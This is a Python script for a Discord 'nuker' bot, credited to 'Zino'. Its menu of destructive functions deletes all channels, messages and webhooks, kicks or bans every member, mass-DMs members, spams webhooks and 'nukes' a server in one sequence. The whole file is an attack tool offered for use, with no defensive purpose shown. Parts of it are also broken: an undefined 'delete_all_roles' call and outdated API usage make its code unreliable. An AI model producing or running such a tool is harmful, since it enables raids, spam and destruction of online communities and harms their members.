import discord
from discord.ext import commands
import asyncio
import random
import aiohttp

# Logging-Konfiguration
import logging
logging.basicConfig(level=logging.ERROR)

# Funktion zum Abrufen von Bot-Token und Server-ID
def get_bot_token_and_server_id():
    bot_token = input("Please enter your Bot Token: ")
    server_id = int(input("Please enter the Server ID: "))
    return bot_token, server_id

# Initialisierung der Discord-Intents
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

# Erstellen des Bot-Clients
bot = commands.Bot(command_prefix='!', intents=intents)

# Funktion zur Ausgabe des Titels
def print_title():
    title = """
\033[92m
▄███████▄       ███▄▄▄▄   ███    █▄     ▄█   ▄█▄    ▄████████    ▄████████ 
██▀     ▄██      ███▀▀▀██▄ ███    ███   ███ ▄███▀   ███    ███   ███    ███ 
      ▄███▀      ███   ███ ███    ███   ███▐██▀     ███    █▀    ███    ███ 
 ▀█▀▄███▀▄▄      ███   ███ ███    ███  ▄█████▀     ▄███▄▄▄      ▄███▄▄▄▄██▀ 
  ▄███▀   ▀      ███   ███ ███    ███ ▀▀█████▄    ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
▄███▀            ███   ███ ███    ███   ███▐██▄     ███    █▄  ▀███████████ 
███▄     ▄█      ███   ███ ███    ███   ███ ▀███▄   ███    ███   ███    ███ 
 ▀████████▀       ▀█   █▀  ████████▀    ███   ▀█▀   ██████████   ███    ███ 
                                        ▀                        ███    ███ 
\033[0m
\033[92mMade by Zino\033[0m
"""
    print(title)

# Menüfunktion mit asynchroner Eingabe
async def menu():
    print("\033[92m" + """
┌─────────────────────────────────────────────────────────┐
│ [ 1] Delete all channels       │ [11] Rename server       │
│ [ 2] Create channels           │ [12] Mass create threads │
│ [ 3] Create roles              │ [13] Webhook spammer     │
│ [ 4] Add webhooks              │ [14] Delete webhook      │
│ [ 5] Kick all members          │ [15] Delete all webhooks │
│ [ 6] Ban all members           │ [16] Server info         │
│ [ 7] Unban all members         │ [17] Rename all members  │
│ [ 8] Copy server               │ [18] Execute script      │
│ [ 9] DM all members            │ [19] Nuke server         │
│ [10] Create/delete channels    │ [20] Update server icon  │
│ [21] Delete all messages       │ [22] Show all roles      │
│ [23] Server settings           │ [24] Change channel desc │
│ [25] Remove bots               │ [26] Delete server       │
│ [27] Notify all members        │ [28] Update server banner │
│ [29] Add custom emojis         │ [30] Clear server        │
│ [31] Empty server              │ [32] Custom function 5   │
└─────────────────────────────────────────────────────────┘
\033[0m
    """)

    print("\033[92mSelect an option (1-32): \033[0m", end="")
    option = await asyncio.get_event_loop().run_in_executor(None, input)
    
    try:
        option = int(option)
    except ValueError:
        print("\033[91mInvalid option. Please try again.\033[0m")
        await menu()
        return

    guild = bot.get_guild(server_id)
    if guild is None:
        print(f"\033[91mThe bot is not connected to the server with ID {server_id}. Please check your Server ID.\033[0m")
        return

    actions = {
        1: delete_all_channels,
        2: create_channels,
        3: create_roles,
        4: add_webhooks,
        5: kick_all_members,
        6: ban_all_members,
        7: unban_all_members,
        8: copy_server,
        9: dm_all_members,
        10: create_and_delete_channels,
        11: rename_server,
        12: mass_create_threads,
        13: webhook_spammer,
        14: delete_webhook,
        15: delete_all_webhooks,
        16: server_info,
        17: rename_all_members,
        18: custom_script,
        19: nuke_server,
        20: update_server_icon,
        21: delete_all_messages,
        22: show_all_roles,
        23: server_settings,
        24: change_channel_description,
        25: remove_bots,
        26: delete_server,
        27: notify_all_members,
        28: update_server_banner,
        29: add_custom_emojis,
        30: clear_server,
        31: empty_server,
        32: custom_function_5
    }

    action = actions.get(option)
    if action:
        await action(guild)
    else:
        print("\033[91mInvalid option. Please try again.\033[0m")
        await menu()

# Implementierung der Funktionen
async def delete_all_channels(guild):
    print("\033[92m[ Deleting all channels... ]\033[0m")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except discord.errors.HTTPException as e:
            print(f"Could not delete channel: {channel.name} (Reason: {str(e)})")
    await menu()

async def create_channels(guild):
    channel_name = input("Enter name for channels: ")
    try:
        channel_count = int(input("How many channels to create: "))
    except ValueError:
        print("\033[91mInvalid number of channels. Please enter a valid integer.\033[0m")
        await create_channels(guild)
        return

    for _ in range(channel_count):
        await guild.create_text_channel(f"{channel_name}-{random.randint(1000, 9999)}")
    print(f"Created {channel_count} channels.")
    await menu()

async def create_roles(guild):
    role_name = input("Enter name for roles: ")
    try:
        role_count = int(input("How many roles to create: "))
    except ValueError:
        print("\033[91mInvalid number of roles. Please enter a valid integer.\033[0m")
        await create_roles(guild)
        return

    for _ in range(role_count):
        await guild.create_role(name=role_name)
    print(f"Created {role_count} roles.")
    await menu()

async def add_webhooks(guild):
    webhook_name = input("Enter name for webhooks: ")
    try:
        webhook_count = int(input("How many webhooks to create per channel: "))
    except ValueError:
        print("\033[91mInvalid number of webhooks. Please enter a valid integer.\033[0m")
        await add_webhooks(guild)
        return

    for channel in guild.text_channels:
        for _ in range(webhook_count):
            await channel.create_webhook(name=f"{webhook_name}-{random.randint(1000, 9999)}")
    print(f"Added webhooks to channels.")
    await menu()

async def kick_all_members(guild):
    print("\033[92m[ Kicking all members... ]\033[0m")
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.kick(reason='Kicked by bot')
                print(f"Kicked {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot kick {member.name}")
    await menu()

async def ban_all_members(guild):
    print("\033[92m[ Banning all members... ]\033[0m")
    for member in guild.members:
        if member != guild.owner:
            try:
                await member.ban(reason='Banned by bot')
                print(f"Banned {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot ban {member.name}")
    await menu()

async def unban_all_members(guild):
    print("\033[92m[ Unbanning all members... ]\033[0m")
    for ban_entry in await guild.bans():
        try:
            await guild.unban(ban_entry.user)
            print(f"Unbanned {ban_entry.user.name}")
        except discord.errors.Forbidden:
            print(f"Cannot unban {ban_entry.user.name}")
    await menu()

async def copy_server(guild):
    print("\033[92m[ Copying server... ]\033[0m")
    # Implement server copy logic here
    await menu()

async def dm_all_members(guild):
    message = input("Enter message to DM all members: ")
    for member in guild.members:
        try:
            if not member.bot:
                await member.send(message)
                print(f"Sent DM to {member.name}")
        except discord.errors.Forbidden:
            print(f"Cannot DM {member.name}")
    await menu()

async def create_and_delete_channels(guild):
    await create_channels(guild)
    await delete_all_channels(guild)

async def rename_server(guild):
    new_name = input("Enter new server name: ")
    try:
        await guild.edit(name=new_name)
        print(f"Server renamed to {new_name}")
    except discord.errors.Forbidden:
        print(f"Cannot rename server")
    await menu()

async def mass_create_threads(guild):
    thread_title = input("Enter title for threads: ")
    try:
        thread_count = int(input("How many threads to create per channel: "))
    except ValueError:
        print("\033[91mInvalid number of threads. Please enter a valid integer.\033[0m")
        await mass_create_threads(guild)
        return

    for channel in guild.text_channels:
        for _ in range(thread_count):
            try:
                await channel.create_thread(name=f"{thread_title}-{random.randint(1000, 9999)}")
                print(f"Created thread in {channel.name}")
            except discord.errors.Forbidden:
                print(f"Cannot create thread in {channel.name}")
    await menu()

async def webhook_spammer(guild):
    webhook_url = input("Enter the webhook URL: ")
    message = input("Enter the message to spam: ")
    try:
        message_count = int(input("How many messages to send: "))
    except ValueError:
        print("\033[91mInvalid number of messages. Please enter a valid integer.\033[0m")
        await webhook_spammer(guild)
        return

    async with aiohttp.ClientSession() as session:
        for _ in range(message_count):
            try:
                async with session.post(webhook_url, json={'content': message}) as response:
                    if response.status == 204:
                        print("Message sent successfully")
                    else:
                        print(f"Failed to send message (status code: {response.status})")
            except Exception as e:
                print(f"An error occurred: {str(e)}")
    await menu()

async def delete_webhook(guild):
    webhook_url = input("Enter the webhook URL to delete: ")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.delete(webhook_url) as response:
                if response.status == 204:
                    print("Webhook deleted successfully")
                else:
                    print(f"Failed to delete webhook (status code: {response.status})")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
    await menu()

async def delete_all_webhooks(guild):
    for channel in guild.text_channels:
        webhooks = await channel.webhooks()
        for webhook in webhooks:
            try:
                await webhook.delete()
                print(f"Deleted webhook: {webhook.name}")
            except discord.errors.Forbidden:
                print(f"Cannot delete webhook: {webhook.name}")
    await menu()

async def server_info(guild):
    info = f"""
Server Name: {guild.name}
Total Members: {guild.member_count}
Total Channels: {len(guild.channels)}
Total Roles: {len(guild.roles)}
"""
    print(info)
    await menu()

async def rename_all_members(guild):
    new_name = input("Enter new name for members: ")
    for member in guild.members:
        try:
            await member.edit(nick=new_name)
            print(f"Renamed {member.name} to {new_name}")
        except discord.errors.Forbidden:
            print(f"Cannot rename {member.name}")
    await menu()

async def custom_script(guild):
    # Implement custom script logic
    await menu()

async def nuke_server(guild):
    await delete_all_channels(guild)
    await create_channels(guild)
    await create_roles(guild)
    await add_webhooks(guild)
    await kick_all_members(guild)
    await ban_all_members(guild)
    await unban_all_members(guild)
    print("\033[92m[ Server nuked successfully! ]\033[0m")
    await menu()

async def update_server_icon(guild):
    icon_url = input("Enter URL of the new server icon (PNG): ")
    async with aiohttp.ClientSession() as session:
        async with session.get(icon_url) as response:
            if response.status == 200:
                icon_data = await response.read()
                try:
                    await guild.edit(icon=icon_data)
                    print("Server icon updated successfully.")
                except discord.errors.Forbidden:
                    print("Cannot update server icon.")
            else:
                print("Failed to fetch the icon image.")
    await menu()

async def delete_all_messages(guild):
    for channel in guild.text_channels:
        try:
            async for message in channel.history(limit=100):
                await message.delete()
                print(f"Deleted message: {message.id}")
        except discord.errors.Forbidden:
            print(f"Cannot delete messages in channel: {channel.name}")
    await menu()

async def show_all_roles(guild):
    roles = [role.name for role in guild.roles]
    print("\033[92m[ Server Roles ]\033[0m")
    for role in roles:
        print(role)
    await menu()

async def server_settings(guild):
    settings = f"""
Server Name: {guild.name}
Region: {guild.region}
Verification Level: {guild.verification_level}
Explicit Content Filter: {guild.explicit_content_filter}
"""
    print(settings)
    await menu()

async def change_channel_description(guild):
    channel_id = int(input("Enter the channel ID: "))
    new_description = input("Enter new channel description: ")
    channel = guild.get_channel(channel_id)
    if channel and isinstance(channel, discord.TextChannel):
        try:
            await channel.edit(topic=new_description)
            print(f"Updated description for channel: {channel.name}")
        except discord.errors.Forbidden:
            print("Cannot update channel description.")
    else:
        print("Channel not found or invalid channel type.")
    await menu()

async def remove_bots(guild):
    for member in guild.members:
        if member.bot:
            try:
                await member.kick(reason="Removed by bot")
                print(f"Removed bot: {member.name}")
            except discord.errors.Forbidden:
                print(f"Cannot remove bot: {member.name}")
    await menu()

async def delete_server(guild):
    print("\033[92m[ Deleting server... ]\033[0m")
    try:
        await guild.delete()
        print("Server deleted successfully.")
    except discord.errors.Forbidden:
        print("Cannot delete server.")
    await menu()

async def notify_all_members(guild):
    message = input("Enter message to notify all members: ")
    for member in guild.members:
        try:
            if not member.bot:
                await member.send(message)
                print(f"Sent notification to {member.name}")
        except discord.errors.Forbidden:
            print(f"Cannot notify {member.name}")
    await menu()

async def update_server_banner(guild):
    banner_url = input("Enter URL of the new server banner (PNG): ")
    async with aiohttp.ClientSession() as session:
        async with session.get(banner_url) as response:
            if response.status == 200:
                banner_data = await response.read()
                try:
                    await guild.edit(banner=banner_data)
                    print("Server banner updated successfully.")
                except discord.errors.Forbidden:
                    print("Cannot update server banner.")
            else:
                print("Failed to fetch the banner image.")
    await menu()

async def add_custom_emojis(guild):
    emoji_url = input("Enter URL of the emoji image (PNG): ")
    emoji_name = input("Enter name for the emoji: ")
    async with aiohttp.ClientSession() as session:
        async with session.get(emoji_url) as response:
            if response.status == 200:
                emoji_data = await response.read()
                try:
                    await guild.create_custom_emoji(name=emoji_name, image=emoji_data)
                    print(f"Added custom emoji: {emoji_name}")
                except discord.errors.Forbidden:
                    print("Cannot add custom emoji.")
            else:
                print("Failed to fetch the emoji image.")
    await menu()

async def clear_server(guild):
    await delete_all_channels(guild)
    await delete_all_roles(guild)
    print("\033[92m[ Server cleared successfully! ]\033[0m")
    await menu()

async def empty_server(guild):
    await delete_all_channels(guild)
    await delete_all_roles(guild)
    print("\033[92m[ Server emptied successfully! ]\033[0m")
    await menu()

async def custom_function_5(guild):
    # Implementiere deine benutzerdefinierte Funktion hier
    print("\033[92m[ Custom Function 5 executed ]\033[0m")
    await menu()

# Event-Handler: Bot ist bereit
@bot.event
async def on_ready():
    print_title()
    await menu()

# Starte den Bot
if __name__ == "__main__":
    bot_token, server_id = get_bot_token_and_server_id()
    bot.run(bot_token)
